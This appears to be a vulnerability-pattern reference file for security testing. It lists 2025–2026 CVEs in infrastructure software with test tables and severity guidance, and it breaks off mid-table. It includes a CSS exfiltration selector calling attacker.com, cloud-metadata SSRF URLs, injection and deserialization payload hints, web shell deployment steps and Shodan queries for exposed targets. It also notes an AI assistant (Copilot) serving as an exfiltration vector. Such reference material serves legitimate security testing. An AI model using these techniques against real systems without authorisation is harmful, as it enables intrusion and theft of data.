# Infrastructure & Platform Vulnerability Patterns

Attack patterns targeting infrastructure components: browser exploits, Node.js sandboxing, SSRF chains, remote access tools, MDM platforms, webmail, critical network infrastructure, and Windows trust mechanism bypasses. Reference file for the vuln-patterns skill.

> **API & protocol patterns** (GraphQL, JWT, OAuth, rate limiting, n8n/workflow, edge frameworks, HTTP/3 race conditions): See [web-vulns.md](web-vulns.md)

---

## Table of Contents

- [CSS-Only Data Exfiltration (CSP Bypass)](#css-only-data-exfiltration-csp-bypass)
- [Node.js Permission Model & TLS Bypass](#nodejs-permission-model--tls-bypass)
- [SSRF via Webhook, Notification, and Import Endpoints](#ssrf-via-webhook-notification-and-import-endpoints)
- [Self-Hosted Remote Desktop Pre-Auth Attack Chains](#self-hosted-remote-desktop-pre-auth-attack-chains)
- [Mobile Device Management Pre-Auth RCE](#mobile-device-management-pre-auth-rce)
- [OAuth First-Party App Trust Abuse (ConsentFix)](#oauth-first-party-app-trust-abuse-consentfix)
- [Webmail RCE — 48-Hour Weaponization Pattern](#webmail-rce--48-hour-weaponization-pattern)
- [Critical Infrastructure Authentication & Deserialization](#critical-infrastructure-authentication--deserialization)
- [MSHTML Mark-of-the-Web Bypass Chain](#mshtml-mark-of-the-web-bypass-chain)
- [Cloud SSO Trust Model Abuse](#cloud-sso-trust-model-abuse)
- [Workflow Automation Platform RCE](#workflow-automation-platform-rce)
- [Enterprise Management Platform RCE](#enterprise-management-platform-rce)
- [Appliance Hardcoded Credentials](#appliance-hardcoded-credentials)
- [Network Infrastructure Auth Bypass](#network-infrastructure-auth-bypass)
- [March 2026 Zero-Day Cluster (Microsoft)](#march-2026-zero-day-cluster-microsoft)
- [Kubernetes Ingress Controller RCE at EOL](#kubernetes-ingress-controller-rce-at-eol)
- [Firewall Management RCE](#firewall-management-rce)

---

## CSS-Only Data Exfiltration (CSP Bypass)

**What it is:** Using CSS features (`@import` chaining, `@property` registration, `paint()` worklets) to exfiltrate data without JavaScript — defeating most Content Security Policy configurations.

**Key CVE:** CVE-2026-2441 (Chrome, CVSS 8.8) — actively exploited before patch. Use-after-free in CSS parsing exploited via `@import` chaining with server-side redirect mechanism. Chrome re-evaluated selectors against DOM without full page reload.

**Where to look:**
- Applications relying on CSP to prevent XSS data exfiltration
- Pages with user-controlled CSS (custom themes, style injections, CSS-in-JS)
- Targets where JavaScript-based XSS is blocked but CSS injection is possible

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | CSS `@import` chain | Inject `@import url()` pointing to attacker-controlled server with redirects | Server receives requests with leaked data in URL parameters |
| 2 | `@property` + `paint()` | Register custom CSS property and worklet; check if compositor thread handles memory safely | Crash or unexpected behavior indicating UAF |
| 3 | Attribute selector exfiltration | Use `input[value^="a"] { background: url(attacker.com/?char=a) }` pattern | Character-by-character exfiltration of input values via CSS |
| 4 | CSS-only keylogging | Combine attribute selectors with `@import` to detect keypresses via style changes | Keystroke data leaked without any JavaScript |
| 5 | Font-based exfiltration | Use `@font-face` with `unicode-range` to detect specific characters on page | Selective font loading reveals page content |

**Severity Guidance:** High-Critical when CSP is the primary XSS mitigation. This bypasses JavaScript-based CSP entirely. Report as CSP bypass + data exfiltration chain. Patched in Chrome Feb 13, 2026 — test other browsers for similar issues.

---

## Node.js Permission Model & TLS Bypass

**What it is:** Exploiting flaws in Node.js's experimental permission model and TLS implementation.

**Key CVEs:**
- **CVE-2026-21636**: Permission model bypass via Unix Domain Socket connections — attackers bypass file/network access restrictions entirely
- **CVE-2026-21637**: TLS PSK/ALPN callback exceptions — uncaught exceptions in TLS callbacks cause process crashes (DoS)

**Where to look:**
- Applications running Node.js with `--experimental-permission` flag
- Services using Node.js TLS with PSK or ALPN callbacks
- Any Node.js app relying on the permission model for security boundaries

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | UDS permission bypass | Connect via Unix Domain Socket to bypass permission model restrictions | File/network access without permission grant |
| 2 | TLS PSK callback crash | Send TLS connection with crafted PSK identity that triggers exception in callback | Process crash (DoS) |
| 3 | ALPN callback exception | Connect with ALPN protocol list that triggers unhandled exception | Process crash via TLS negotiation |

**Severity Guidance:** High for permission model bypass (security boundary violation); Medium for TLS DoS (service availability). Permission model bypass is especially impactful when apps rely on it for sandboxing — test any Node.js service that uses `--experimental-permission`.

---

## SSRF via Webhook, Notification, and Import Endpoints

**What it is:** Server-Side Request Forgery through webhook URL validators, notification testers, and asset import features that perform incomplete IP validation.

**Recent CVE cluster (March 2026):**
- **CVE-2026-30832** (Soft Serve Git, CVSS 9.1): blind SSRF via LFS endpoint in repo import → full read via malicious LFS server chain
- **CVE-2026-28680** (Ghostfolio, CVSS 9.3): full-read SSRF via manual asset import → AWS IMDS credential exfiltration
- **CVE-2026-30840** (Wallos, CVSS 8.8): authenticated SSRF via notification tester endpoints
- **CVE-2026-30242** (Plane, CVSS 8.5): webhook URL serializer only checks `is_loopback`, not RFC 1918 ranges
- **CVE-2026-30834** (PinchTab, CVSS 7.5): API-accessible SSRF via `/download` endpoint

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Incomplete IP validation | Use `10.0.0.1`, `172.16.0.1`, `192.168.1.1` when only loopback is blocked | Access to internal network when only 127.0.0.1 is validated |
| 2 | Webhook URL test | Set webhook URL to `http://169.254.169.254/latest/meta-data/` | Cloud metadata accessible via webhook test |
| 3 | Notification tester | Use notification test/preview features with internal URLs | Response body or timing reveals internal service access |
| 4 | Asset import SSRF | Import asset/URL/feed from `http://internal-service:port/` | Import fetches internal resources |
| 5 | LFS/Git import chain | Configure repo with malicious LFS server pointing to internal targets | SSRF triggered during git LFS fetch operations |
| 6 | DNS rebinding | Use DNS rebinding to bypass IP validation at resolution time | Initial DNS resolves to allowed IP, subsequent resolve to internal |

**Severity Guidance:** Critical when full response read-back enables credential theft (cloud metadata, internal APIs). High for blind SSRF. The "only checks loopback" pattern is the most common validation gap — always test RFC 1918 ranges.

---

## Self-Hosted Remote Desktop Pre-Auth Attack Chains

**What it is:** Authentication bypass and SSRF in self-hosted remote desktop (RustDesk, Guacamole, MeshCentral) commonly exposed to the internet.

**Key CVE cluster (RustDesk, March 2026):** CVE-2026-30789 (session replay auth bypass, Client ≤1.4.5), CVE-2026-30784 (missing authz, Server ≤1.7.5), CVE-2026-30797 (API MitM), CVE-2026-30796 (cleartext creds), CVE-2026-30791 (weak crypto), plus pre-auth SSRF before password verification.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Session replay | Capture and replay authentication session tokens | Access granted with replayed credentials (CVE-2026-30789) |
| 2 | Pre-auth SSRF | Send requests to internal IPs before authenticating | Internal port scan results returned before password check |
| 3 | API message manipulation | Intercept and modify API messages between client and server | Unauthorized operations via modified messages |

**Severity Guidance:** High-Critical for pre-auth chains (SSRF + session replay = full infrastructure access). Scan Shodan for `rustdesk` on ports 21115-21119.

---

## Mobile Device Management Pre-Auth RCE

**What it is:** Unauthenticated RCE in enterprise MDM platforms — high-value because MDM servers control thousands of devices with elevated privileges.

**Key CVEs (Ivanti EPMM, Jan-Feb 2026):** CVE-2026-1281 (CVSS 9.8, pre-auth RCE via `/mifs/c/appstore/fob/`, public PoC, mass exploitation) and CVE-2026-1340 (CVSS 9.8, companion RCE via `/mifs/c/aftstore/fob/`).

**Root cause:** Improper handling of attacker-controlled input within Bash scripts — specifically **bash arithmetic expansion** in the `map-appstore-url` script. Attackers inject OS commands via HTTP GET parameters that are processed by Bash's `$((...))` arithmetic evaluation. Both endpoints (`/mifs/c/appstore/fob/` and `/mifs/c/aftstore/fob/`) share the same root cause.

**Mass exploitation scope (March 2026):** CISA KEV addition. Observed across US, Germany, Australia, Canada. Sectors: state/local government, healthcare, manufacturing, professional/legal services, high technology. Post-exploitation: webshell deployment, reverse shells on TCP/443, secondary payload retrieval via curl/wget, database export/staging, anti-forensic cleanup.

**Where to look:** Ivanti EPMM/MobileIron, ManageEngine, VMware Workspace ONE, Microsoft Intune. Search Shodan: `"MobileIron"`, `"/mifs/"` paths.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Bash arithmetic expansion | Send GET requests to `/mifs/c/appstore/fob/` with arithmetic expansion payloads in parameters | OS command execution via `$((...))` evaluation |
| 2 | Companion endpoint | Test `/mifs/c/aftstore/fob/` with same payloads (same root cause, different feature) | Command execution via Android File Transfer endpoint |
| 3 | Unauthenticated endpoints | Fuzz MDM admin paths without credentials | Admin functions accessible pre-auth |
| 4 | File upload via enrollment | Use device enrollment endpoints to upload arbitrary files | Web shell deployment via enrollment flow |
| 5 | API version mismatch | Test legacy API versions alongside current ones | Older APIs may lack auth checks |

**Severity Guidance:** Critical — compromised MDM = full mobile fleet control (push configs, install apps, wipe devices). The **bash arithmetic expansion** pattern is a variant worth hunting for in any web app that passes user input to shell scripts — test arithmetic contexts `$((...))` not just standard command injection `$(...)`.

---

## OAuth First-Party App Trust Abuse (ConsentFix)

**What it is:** Abusing trusted first-party application status in OAuth/SSO implementations to bypass MFA and Conditional Access policies.

**Key disclosure:** ConsentFix (Push Security, March 2026) — Azure CLI's first-party trust status allows it to obtain OAuth tokens that bypass MFA and Conditional Access entirely. Attacker phishes victim into pasting a URL containing OAuth key material.

**Where to look:**
- Microsoft Entra ID / Azure AD environments with first-party apps
- Any SSO implementation with implicitly trusted applications excluded from consent restrictions
- OAuth flows where first-party apps are exempt from security policies

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | First-party token abuse | Use first-party client IDs (e.g., Azure CLI) in OAuth flows | Token obtained without MFA/Conditional Access |
| 2 | Admin consent bypass | First-party apps excluded from admin consent restrictions | Elevated permissions granted without admin approval |
| 3 | Cross-tenant token use | Use token from first-party app flow across tenants | Token valid in unintended tenant |

**Severity Guidance:** Critical — bypasses MFA entirely. Relevant for any enterprise using Microsoft Entra ID. Maps to Fortinet CVE-2026-24858 (FortiCloud SSO auth bypass, CISA KEV) as part of a broader SSO trust model abuse pattern.

---

## Webmail RCE — 48-Hour Weaponization Pattern

**What it is:** Critical RCE/XSS in webmail platforms weaponized within days, targeting ~84,000+ internet-facing instances.

**Key CVEs (Roundcube, Feb 2026):** CVE-2025-49113 (CVSS 9.9, RCE weaponized in 48h, CISA KEV) and CVE-2025-68461 (stored XSS in message rendering).

**Where to look:** Self-hosted webmail (Roundcube, Zimbra, Horde), enterprise email gateways, Roundcube < 1.6.10 / < 1.5.10.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Version fingerprint | Check `/program/lib/Roundcube/rcube.php` or server headers | Unpatched Roundcube version |
| 2 | Stored XSS via email | Send crafted email with malicious HTML/JS in body or headers | Script execution in victim's webmail session |
| 3 | MIME parsing abuse | Send email with malformed MIME structure | Parser confusion leading to code execution |

**Severity Guidance:** Critical — webmail accesses all email content and contacts. 48-hour weaponization means unpatched instances are likely compromised.

---

## Critical Infrastructure Authentication & Deserialization

**What it is:** Auth bypass and Java deserialization RCE in network management interfaces — often CVSS 10.0 with root access.

**Recent examples:** CVE-2026-20079/20131 (Cisco FMC, CVSS 10.0 pair: boot-time auth bypass + Java deser RCE → root), CVE-2026-22719 (VMware Aria, CVSS 8.1, CISA KEV, actively exploited), CVE-2026-20128/20122 (Cisco SD-WAN, actively exploited March 2026), CVE-2026-24512 (K8s ingress-nginx, CVSS 8.8, project retiring — no future patches for 50% of clusters), CVE-2026-20965 (Azure WAC, SSO pivot tenant-wide).

**Where to look:** Network management consoles, Java-based management APIs, migration/upgrade workflows, boot-time service processes.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Boot process auth bypass | Identify boot-time services with improper auth initialization | Admin access without credentials |
| 2 | Java deser on management APIs | Send crafted serialized objects (ysoserial payloads) to management endpoints | RCE indicating deserialization processing |
| 3 | Migration workflow injection | Test migration/upgrade endpoints for command injection | Command execution during privileged operations |

**Severity Guidance:** Critical — consistently CVSS 9.8-10.0 with root access. High-value because enterprises delay patching management infrastructure.

---

## MSHTML Mark-of-the-Web Bypass Chain

**What it is:** Exploiting URL validation flaws in Windows MSHTML/IE components to bypass Mark-of-the-Web (MotW) protections and achieve code execution — a recurring pattern across multiple February 2026 zero-days.

**Key CVEs (February 2026 Patch Tuesday — 6 actively exploited zero-days):**
- **CVE-2026-21513** (MSHTML, CVSS 8.8): insufficient URL validation in `ieframe.dll` → MotW bypass + IE ESC bypass → `ShellExecuteExW` code execution. Attributed to APT28 (Russia). LNK file payload communicating with `wellnesscaremed[.]com`. Akamai published detailed exploitation analysis.
- **CVE-2026-21510** (Windows Shell, CVSS 8.8): security feature bypass in Windows Shell — MotW bypass enabling untrusted content execution
- **CVE-2026-21514** (Microsoft Word, CVSS 7.8): security feature bypass — MotW bypass specifically via crafted Word documents
- **CVE-2026-21519** (Desktop Window Manager, CVSS 7.8): privilege escalation — post-exploitation elevation
- **CVE-2026-21533** (Windows Remote Desktop, CVSS 7.8): privilege escalation via Remote Desktop Services

**Why MotW bypass matters:** MotW is Windows' primary trust mechanism for files downloaded from the internet. Bypassing it means SmartScreen, Protected View, and macro-blocking protections are all defeated. Three separate MotW bypasses in a single Patch Tuesday (CVE-2026-21510, 21513, 21514) indicates this is a hot vulnerability class being actively researched by both APT groups and security researchers.

**Where to look:**
- Any Windows application processing URLs or web content through MSHTML/IE components
- Applications using `ieframe.dll`, `mshtml.dll`, or legacy IE rendering
- Electron and CEF-based apps that may invoke IE components for URL handling
- File format handlers that embed URLs (LNK, DOCX, RTF, PDF)

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | URL validation in IE components | Craft URLs that pass validation but invoke dangerous handlers via `ieframe.dll` | MotW removed from downloaded content; SmartScreen bypassed |
| 2 | LNK file MotW bypass | Create LNK files with crafted target URLs containing MSHTML-triggering paths | File executes without Protected View warning |
| 3 | DOCX embedded URL bypass | Embed URLs in Word documents that invoke legacy IE rendering paths | Macros/scripts execute without MotW protection |
| 4 | IE ESC bypass chain | Chain URL validation flaw with Internet Explorer Enhanced Security Configuration bypass | Full code execution from restricted browsing context |
| 5 | Cross-zone navigation | Craft URLs that transition from Internet zone to Local Machine zone via parser confusion | Elevated privileges for web content |

**Severity Guidance:** High-Critical. MotW bypasses are consistently rated CVSS 7.8-8.8 and are actively exploited by nation-state actors. The pattern recurs because Windows has multiple independent URL parsing/validation paths (Shell, MSHTML, Word, Explorer) that can disagree on trust. Any application that invokes Windows URL handling is a potential target. Check if target applications pass external URLs to Windows Shell functions without independent validation.

---

## Chrome Sandbox Escape via Navigation (March 2026)

**Key CVE:** CVE-2026-3545 (CVSS 9.6) — sandbox escape via insufficient data validation in Chrome's Navigation component.

**Why it matters:** Chrome sandbox escapes are rare and extremely high value ($100K+ in Google's VRP). AI IDEs like Cursor and Windsurf ship legacy Chromium builds with 94+ known vulnerabilities.

**Where to look:** Applications embedding Chromium (Electron, CEF-based apps) may inherit navigation validation flaws.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Navigation data validation | Craft navigation events with malformed or unexpected data types | Sandbox boundary crossed during navigation |
| 2 | Embedded Chromium version check | Identify Chromium version in Electron/CEF apps | Unpatched versions vulnerable to known sandbox escapes |

**Severity Guidance:** Critical. Sandbox escapes enable full system compromise. Also test ICS/OT targets: CVE-2026-3630 (Delta Electronics COMMGR2, CVSS 9.8, stack buffer overflow in industrial gateway).

**Node.js `vm` Sandbox Escape via Host Object Exposure:**
**Key CVE:** CVE-2026-30957 (OneUptime Synthetic Monitors, CVSS 9.9) — user-defined monitoring scripts run in Node.js `vm` context that inadvertently exposes live Playwright `browser`/`page` objects. Attacker invokes Playwright APIs to spawn arbitrary executables on the probe server. **Pattern:** Any platform using `vm`/`vm2`/`isolated-vm` that passes capability-bearing host objects (Playwright, Puppeteer, `child_process`, database clients) into the sandbox. Also: CVE-2026-25049 (n8n, CVSS 9.4) — JavaScript `with` statement escapes expression sandbox; CVE-2026-30887 (OneUptime Probe, unsandboxed code execution). **Where to look:** Monitoring platforms, workflow automation, CI/CD custom script runners, serverless function sandboxes, low-code platforms with custom code blocks.

---

## Cloud SSO Trust Model Abuse

**What it is:** Exploiting trust relationships in cloud SSO/management platforms where one authenticated account can access resources belonging to other accounts. Combines multi-tenant trust boundary failures with SSO implementation flaws.

**Key CVEs:**
- **CVE-2026-24858** (Fortinet FortiOS SSO, CVSS 9.4, CISA KEV): FortiCloud SSO auth bypass — attacker with one FortiCloud account accessed FortiGate devices registered to other accounts; created local admin accounts on victim firewalls; actively exploited Jan 2026; affects FortiOS, FortiManager, FortiAnalyzer, FortiProxy, FortiWeb
- Related to **ConsentFix** (Azure CLI first-party trust abuse, see OAuth section) as both exploit SSO trust models

**Where to look:** Any multi-tenant cloud management platform with SSO: FortiCloud, Azure AD/Entra ID, AWS SSO, Cisco Meraki, Palo Alto Panorama, SaaS admin panels with federated auth.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Cross-tenant device access | Authenticate to cloud management portal; enumerate device IDs from other tenants | Device access granted across tenant boundaries |
| 2 | SSO token scope validation | Obtain SSO token; test if it grants access to resources outside your assigned scope | Token accepted for cross-account operations |
| 3 | Local admin creation | After SSO auth, attempt to create local admin accounts on managed devices | Admin account persists after SSO session ends |

**Severity Guidance:** Critical — SSO auth bypass with cross-tenant access is consistently CVSS 9.0+. CISA added CVE-2026-24858 to KEV within days. Pattern: cloud management platforms with multi-tenant SSO are high-value targets.

---

## Workflow Automation Platform RCE

**What it is:** Unauthenticated or low-privilege RCE in workflow automation platforms (n8n, Make, Zapier, Power Automate) — these platforms execute arbitrary code by design, making any auth bypass critical.

**Key CVEs (n8n, Jan-Feb 2026):**
- **CVE-2026-21858** (Ni8mare, CVSS 10.0): unauthenticated RCE via content-type bypass → `req.body.files` override → credential extraction → admin session forging → workflow RCE; ~100K servers globally
- **CVE-2026-25049** (CVSS 9.9): authenticated RCE via crafted workflow expressions enabling arbitrary system commands

**Where to look:** Self-hosted n8n, Make, Huginn, Windmill, Activepieces, Apache Airflow, Temporal. Search Shodan: `n8n`, `X-n8n-Version`, port 5678.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Content-type bypass | Send requests without `multipart/form-data` to file handling endpoints | `req.body.files` override enabling file path manipulation |
| 2 | Workflow expression injection | Craft workflow expressions with system command payloads | Command execution via workflow runtime |
| 3 | Credential extraction | Access configuration/database files after initial foothold | Admin credentials, encryption keys in plaintext |

**Severity Guidance:** Critical — workflow platforms run arbitrary code by design. Any auth bypass = immediate RCE. n8n's 100K+ instances make this a high-volume target.

## Enterprise Management Platform RCE

**What it is:** Unauthenticated RCE in IT management platforms that control large device fleets.

**Key CVEs:**
- **CVE-2025-40551** (SolarWinds WHD, CVSS 9.8): unauthenticated RCE → lateral movement via Zoho Meetings + Cloudflare tunnels + Velociraptor C2; state-level exploitation
- **CVE-2026-22719** (VMware Aria, CVSS 8.1): command injection during migration; CISA KEV March 2026

**Where to look:** SolarWinds WHD, VMware Aria/vRealize, ServiceNow, ManageEngine. Shodan: ports 8443, 8787, 443.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Unauthenticated RCE | Probe management API endpoints without credentials | Command execution or internal path disclosure |
| 2 | Migration path exploitation | Test upgrade/migration endpoints (CVE-2026-22719 pattern) | Reduced auth on migration services |

**Severity Guidance:** Critical — management platforms control device fleets.

---

## Appliance Hardcoded Credentials

**What it is:** Enterprise appliances (backup, storage, DR) shipping with hardcoded admin credentials — often plaintext in config files, enabling zero-day persistent access by APT groups.

**Key CVE:** CVE-2026-22769 (Dell RecoverPoint for VMs, CVSS 10.0) — plaintext creds at `tomcat-users.xml`; China-nexus UNC6201 exploited since mid-2024 → Tomcat Manager web shell → BRICKSTORM/GRIMBOLT backdoors via "Ghost NICs" (ephemeral virtual interfaces for lateral movement). Appliances lack EDR, enabling long-term persistence.

**Where to look:** Dell RecoverPoint, Veeam, Commvault, Veritas, Cohesity, Rubrik. Shodan: ports 8443, 9090, 443.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Default/hardcoded creds | Check `tomcat-users.xml`, `application.yml`, `.env` | Admin access without brute-forcing |
| 2 | Tomcat Manager deployment | Test WAR file deployment via `/manager/text/deploy` | Web shell deployment capability |

**Severity Guidance:** Critical (CVSS 10.0). Backup/DR appliances access all protected data and lack EDR monitoring.

---

## Network Infrastructure Auth Bypass

**What it is:** Authentication bypass in network management planes — SD-WAN controllers, EoL routers, VPN gateways — enabling unauthenticated administrative access to devices managing entire network fabrics.

**Key CVEs (Feb-March 2026):**
- **CVE-2026-20127** (Cisco Catalyst SD-WAN, CVSS 10.0): improper authentication in peering mechanism allows unauthenticated remote attacker to bypass auth and gain high-privilege internal access. Exploited by UAT-8616 **since 2023** — chained with CVE-2022-20775 (CVSS 7.8 privilege escalation) for root via software downgrade-then-restore. CISA KEV + Emergency Directive ED 26-03, 24-hour patch mandate. Largest attack spike **March 4, 2026**. Post-exploitation: version downgrade → old privesc → restore
- **CVE-2026-20128/20122** (Cisco Catalyst SD-WAN Manager, actively exploited March 2026): credential file exposure (20128) + authenticated API file overwrite (20122). Activity spike March 4 coincided with 20127; ACSC + CISA advisories. Post-exploitation: **web shell deployment confirmed**, lateral movement between SD-WAN deployments
- **CVE-2026-0625** (D-Link DSL routers, CVSS 9.3): command injection in `dnscfg.cgi` — unauthenticated DNS modification on EoL devices. Exploited since November 2025. **No patch** — devices EoL since 2020

**Where to look:** Cisco SD-WAN (vSmart/vManage), EoL routers still in production, Fortinet/Ivanti VPN gateways. Shodan: `Cisco SD-WAN`, `vManage`, `D-Link DSL`.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Peering auth bypass | Send crafted requests to SD-WAN peering endpoints | Administrative access without credentials |
| 2 | NETCONF config push | After auth bypass, test NETCONF for fabric-wide config changes | Routing modification, unauthorized peer connections |
| 3 | DNS settings injection | Probe `dnscfg.cgi` or similar DNS config endpoints on consumer routers | Command injection via DNS server parameters |
| 4 | Software downgrade chain | Check version management endpoints for downgrade capability | CVE chain: auth bypass → downgrade → privesc → restore |

**Severity Guidance:** Critical. SD-WAN controllers manage entire network fabrics — compromising one yields fabric-wide access. EoL devices with no patch represent permanent risk. The UAT-8616 downgrade technique is a novel chaining pattern: bypass auth → downgrade software → exploit old privesc → restore to original version.

---

## March 2026 Patch Tuesday Cluster (Microsoft)

**What it is:** Microsoft's March 10, 2026 Patch Tuesday addressed 84 CVEs (ZDI count including Edge/Chromium) with 2 publicly disclosed zero-days and 8 Critical vulnerabilities. Follows February's unprecedented 6 zero-days. None actively exploited at disclosure time — rare defensive window.

**Key CVEs:**

| CVE | CVSS | Component | Type |
|-----|------|-----------|------|
| CVE-2026-21536 | 9.8 | Devices Pricing Program | Unauth RCE — highest CVSS in release, no user interaction |
| CVE-2026-21262 | Critical | SQL Server | Privilege escalation to sysadmin (zero-day, publicly disclosed) |
| CVE-2026-26144 | Critical | Microsoft Excel | Info disclosure **exploitable via Copilot Agent mode** |
| CVE-2026-26113 | Critical | Microsoft Office | Remote code execution via Preview Pane |
| CVE-2026-26110 | Critical | Microsoft Office | Remote code execution via Preview Pane |
| CVE-2026-26111 | Critical | Windows RRAS | Unauth RCE → SYSTEM on RRAS servers |
| CVE-2026-24983/24985/24993 | 6.8–7.8 | Win32 Kernel, FAT, MMC | EoP→SYSTEM, VHD RCE, .msc RCE (all actively exploited) |
| CVE-2026-23669 | Critical | Print Spooler | RCE — PrintNightmare-adjacent pattern |
| CVE-2026-26114 | 8.8 | SharePoint Server | Deserialization RCE (on-prem SP 2016/2019/SE) |

**Additional bounty-relevant CVEs (CrowdStrike analysis: 46 EoP, 16 RCE, 10 info disclosure across 82 total):**

| CVE | CVSS | Component | Type |
|-----|------|-----------|------|
| CVE-2026-26125 | 8.6 | Payment Orchestrator Service | EoP via missing authentication — **bounty-relevant**: test payment/billing service endpoints for unauthenticated access |
| CVE-2026-23651 | 6.7 | ACI Confidential Containers | EoP via regex flaw — regex-based auth bypass in container isolation |
| CVE-2026-26124 | 6.7 | ACI Confidential Containers | EoP via path traversal — container escape pattern |
| CVE-2026-26122 | 6.5 | ACI Confidential Containers | Info disclosure via insecure defaults — default-config exposure |
| CVE-2026-23674 | Critical | MapUrlToZone | Security feature bypass — URL zone restriction bypass |

**Test patterns:** **RRAS RCE (CVE-2026-26111)** enables unauth SYSTEM on exposed RRAS; **Office Preview Pane** (CVE-2026-26110/26113) — exploitation requires only file preview; **Payment Orchestrator (CVE-2026-26125)** — missing auth on billing services, test payment/orchestrator endpoints for unauth access; **ACI container escape (CVE-2026-26124)** — path traversal in container isolation; **MapUrlToZone bypass (CVE-2026-23674)** — URL zone restriction bypass, generalizable to any URL-zone-based security; **SharePoint deser** (CVE-2026-26114): .NET deser on on-prem SP 2016/2019/SE; **Excel via Copilot** (CVE-2026-26144) — first Critical where AI assistant is exploitation vector. **Variant analysis:** ZDI noted CVE-2026-23668 combined two separate GDI locking issues — GDI lock/release variant hunting is productive.

**Severity Guidance:** 8+ Critical CVEs, 2 unauth RCE. Preview Pane is a recurring Office attack vector. CVE-2026-26144 Copilot Agent exfil represents a new pattern class. CVE-2026-26125 missing auth on payment services is a bounty-relevant pattern.

---

## Kubernetes Ingress Controller RCE at EOL

**What it is:** Annotation injection enabling RCE and Kubernetes secret disclosure in ingress-nginx — published March 9, 2026, coinciding with the project reaching end-of-life. No patch available at time of advisory.

**Key CVEs:**
- **CVE-2026-3288** (ingress-nginx, CVSS 8.8): annotation injection in `rewrite-target` enabling RCE and K8s secret disclosure
- Related: CVE-2026-1580, CVE-2026-24512, CVE-2026-24513, CVE-2026-24514

**Where to look:** Any Kubernetes cluster using ingress-nginx (extremely common — default ingress controller for many K8s deployments). Check `kubectl get pods -n ingress-nginx`.

**Test patterns:**

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Annotation injection | Craft Ingress resources with malicious `rewrite-target` annotations | Command execution in nginx controller pod |
| 2 | Secret disclosure | After injection, attempt to read K8s secrets mounted in controller | TLS certificates, service account tokens |
| 3 | EOL version detection | Check ingress-nginx version; if EOL, no patch is coming | Unpatched annotation injection vectors |

**Severity Guidance:** High-Critical. The EOL timing makes this especially dangerous — many clusters will never receive a fix. K8s secret disclosure can yield cluster-wide compromise. Recommend migration to alternatives (e.g., NGINX Gateway API, Traefik, Istio).

---

## Firewall Management RCE

**What it is:** Unauthenticated RCE as root in firewall management consoles — Java deserialization and input validation flaws that grant complete control over network security infrastructure.

**Key CVEs:**
- **CVE-2026-20131** (Cisco Secure FMC, CVSS 10.0): unauthenticated RCE as root via crafted Java byte stream. Exploits Apache Commons Collections/Spring gadget chains. Affects versions 6.4.0-10.0.0; no workaround
- **CVE-2026-20079** (Cisco Secure FMC, CVSS 10.0): paired with CVE-2026-20131 — dual CVSS 10.0 in the same product

**Where to look:** Cisco FMC/FTD (ports 443, 8305), Palo Alto Panorama, FortiManager, Check Point SmartConsole. Shodan: `Cisco Firepower`.

**Test patterns:** (1) Java deser probe → send crafted serialized objects to management endpoints; (2) Gadget chain detection → test Commons Collections, Spring, ROME chains → watch for DNS/HTTP callbacks; (3) Version fingerprint → versions 6.4.0-10.0.0 vulnerable.

**Severity Guidance:** Critical (dual CVSS 10.0). Unauth RCE as root on firewall management = complete network compromise.

---

## Deserialization Patch Bypass (Variant Hunting)

**What it is:** Vendors patch a known deserialization RCE but the fix is incomplete — the same deserialization endpoint accepts different gadget chains or object types not covered by the original patch.

**Key CVE:** CVE-2025-26399 (SolarWinds Web Help Desk <= 12.8.7 Hotfix 1, CVSS 9.8) — unauthenticated Java deserialization RCE that **bypasses the patch for CVE-2024-28988** (the original deser RCE). Added to CISA KEV March 9, 2026; actively exploited. The original fix blocked specific gadget chains but left the deserialization endpoint accessible with alternative payloads.

**Where to look:** Any product previously patched for deser — SolarWinds WHD, Atlassian Confluence, Fortra GoAnywhere MFT, Apache OFBiz, VMware.

**Test patterns:** (1) Alternative gadget chains → test CommonsCollections, Spring, ROME, BeanUtils on patched endpoints; (2) Endpoint reachability → verify deser endpoint still accepts objects post-patch; (3) Version-specific bypass → test if hotfix processes serialized input via different chain.

**Severity Guidance:** Critical (CVSS 9.8). Patch bypass variants are high-value — demonstrate incomplete fixes. Use `/variant-hunt`.

---

## DNS ACL TOCTOU Bypass (Kubernetes)

**Key CVE:** CVE-2026-26017 (CoreDNS, CVSS 7.7) — `acl` plugin checks original query, then `rewrite` changes it to blocked name after check passes → DNS segmentation bypass in multi-tenant K8s.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | ACL + rewrite order | Query allowed name that rewrites to blocked name | Blocked resource resolved via allowed alias |
| 2 | Multi-tenant DNS isolation | Cross-namespace DNS queries via rewritten names | Tenant A resolving tenant B's services |

---

## Unauthenticated Backup/Export Endpoint Disclosure

**What it is:** Management UIs expose backup/export/download endpoints without authentication — leaking credentials, TLS private keys, session tokens, and encryption keys. Often the backup encryption key is returned in a response header, making decryption trivial.

**Key CVE:** CVE-2026-27944 (Nginx UI < 2.3.3, CVSS 9.8) — `/api/backup` accessible without auth; AES-256 encryption key + IV leaked in `X-Backup-Security` response header. Attacker downloads full backup → decrypts with leaked key → obtains admin creds, session tokens, TLS private keys → full takeover.

**Where to look:** Any admin panel/management console with backup/export/download — Nginx-UI, cPanel, Plesk, Webmin, pfSense, OPNsense, Proxmox, any self-hosted tool with settings export.

| # | Test | What to look for |
|---|------|-----------------|
